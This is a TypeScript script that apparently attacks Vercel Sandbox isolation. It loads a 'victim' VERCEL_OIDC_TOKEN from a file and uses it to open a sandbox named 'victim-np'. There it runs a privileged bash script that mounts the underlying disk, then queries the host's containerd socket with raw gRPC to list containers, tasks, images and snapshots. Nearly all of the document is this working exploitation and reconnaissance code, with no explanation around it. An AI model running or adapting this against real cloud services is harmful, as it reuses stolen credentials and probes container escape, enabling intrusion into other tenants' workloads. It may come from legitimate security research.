import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
mkdir -p /mnt/vda2
mount -t xfs /dev/vda /mnt/vda2 2>/dev/null
R=/mnt/vda2
printf '\\x00\\x00\\x00\\x00\\x00' > /tmp/empty.msg
grpc_raw() {
  local path=$1 ns=$2
  local H=""
  [ -n "$ns" ] && H="-H containerd-namespace:$ns"
  timeout 8 curl -s --http2-prior-knowledge --unix-socket $R/run/containerd/containerd.sock \
    -H 'Content-Type: application/grpc' -H 'TE: trailers' -H 'Content-Length: 5' \
    $H --data-binary @/tmp/empty.msg \
    -D /tmp/grpc.hdr -o /tmp/grpc.body "http://unix$path"
  local st=$(grep -a '^grpc-status' /tmp/grpc.hdr | tr -d '\\r' | awk '{print $2}')
  local msg=$(grep -a '^grpc-message' /tmp/grpc.hdr | tr -d '\\r' | cut -d: -f2-)
  echo "== $path ns=$ns -> status=$st msg=$msg"
  if [ -s /tmp/grpc.body ]; then
    cp /tmp/grpc.body /tmp/last.body
    head -c 60 /tmp/grpc.body | od -An -c | head -3
  fi
}
grpc_raw /containerd.services.containers.v1.Containers/List default
grpc_raw /containerd.services.containers.v1.Containers/List cell
grpc_raw /containerd.services.containers.v1.Containers/List vercel
grpc_raw /containerd.services.tasks.v1.Tasks/List default
grpc_raw /containerd.services.tasks.v1.Tasks/List cell
grpc_raw /containerd.services.images.v1.Images/List default
grpc_raw /containerd.services.snapshots.v1.Snapshots/List default
grpc_raw /containerd.services.snapshots.v1.Snapshots/List cell
echo
echo "===== full containers list (default) if any ====="
if [ -s /tmp/last.body ]; then strings -n 6 /tmp/last.body | head -40; fi
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore12.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore12.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 180_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });